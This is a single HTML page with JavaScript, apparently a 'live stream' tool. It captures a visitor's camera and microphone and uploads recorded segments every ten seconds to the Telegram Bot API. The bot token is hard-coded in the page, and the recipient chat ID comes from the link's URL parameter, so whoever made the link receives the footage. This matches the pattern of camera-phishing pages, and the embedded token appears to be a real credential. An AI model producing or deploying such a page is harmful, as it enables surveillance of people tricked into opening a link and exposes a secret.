<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Camera Stream</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 15px; background: #121212; color: #fff; }
        video { width: 100%; max-width: 400px; height: auto; border-radius: 10px; background: #000; margin-bottom: 15px; }
        .btn-group { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin-bottom: 15px; }
        button { border: none; padding: 12px 18px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        .start { background: #2ed573; color: white; }
        .stop { background: #ff4757; color: white; }
        .switch { background: #70a1ff; color: white; }
        #status { margin-top: 15px; font-size: 14px; color: #ffa500; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Live Stream & Recorder</h2>
    <video id="preview" autoplay playsinline muted></video>

    <div class="btn-group">
        <button class="start" id="startBtn">Start Streaming</button>
        <button class="switch" id="switchBtn">Switch Camera</button>
        <button class="stop" id="stopBtn" disabled>Stop</button>
    </div>

    <p id="status">Grant camera and mic permissions to begin.</p>

    <script>
        const BOT_TOKEN = '8928916946:AAEYVCHLdoVB-l0svDNHInRmc25myCz8pnw';
        
        let currentStream = null;
        let mediaRecorder = null;
        let isRecording = false;
        let currentFacingMode = "user";
        let targetChatId = null;

        const videoElement = document.getElementById('preview');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const switchBtn = document.getElementById('switchBtn');
        const statusText = document.getElementById('status');

        const urlParams = new URLSearchParams(window.location.search);
        targetChatId = urlParams.get('chat_id');

        async function startCamera(facingMode) {
            if (currentStream) {
                currentStream.getTracks().forEach(track => track.stop());
            }

            try {
                currentStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode },
                    audio: true
                });
                videoElement.srcObject = currentStream;
                statusText.innerText = "Camera ready. Press Start to stream.";
            } catch (err) {
                statusText.innerText = "Permission denied or camera error: " + err.message;
            }
        }

        switchBtn.onclick = async () => {
            currentFacingMode = (currentFacingMode === "user") ? "environment" : "user";
            await startCamera(currentFacingMode);
            if (isRecording) {
                startRecording();
            }
        };

        function startRecording() {
            if (!currentStream) return;

            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });

            mediaRecorder.ondataavailable = async (event) => {
                if (event.data && event.data.size > 0 && targetChatId) {
                    sendChunkToTelegram(event.data);
                }
            };

            mediaRecorder.start(10000); 
            isRecording = true;
            startBtn.disabled = true;
            stopBtn.disabled = false;
            statusText.innerText = "🔴 Streaming Live Audio/Video to Telegram...";
        }

        stopBtn.onclick = () => {
            if (mediaRecorder && isRecording) {
                mediaRecorder.stop();
                isRecording = false;
                startBtn.disabled = false;
                stopBtn.disabled = true;
                statusText.innerText = "Stream stopped.";
            }
        };

        startBtn.onclick = async () => {
            if (!targetChatId) {
                targetChatId = prompt("Enter your Telegram Chat ID:");
            }
            if (targetChatId) {
                startRecording();
            } else {
                statusText.innerText = "Error: Chat ID is required to deliver video.";
            }
        };

        async function sendChunkToTelegram(blob) {
            statusText.innerText = "Uploading live video segment to Telegram...";
            const formData = new FormData();
            formData.append('chat_id', targetChatId);
            formData.append('video', blob, 'stream_segment.webm');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    statusText.innerText = "🔴 Streaming live to Telegram...";
                } else {
                    statusText.innerText = "Error uploading segment to Telegram.";
                }
            } catch (err) {
                statusText.innerText = "Network error sending stream segment.";
            }
        }

        window.onload = () => startCamera(currentFacingMode);
    </script>
</body>
</html>
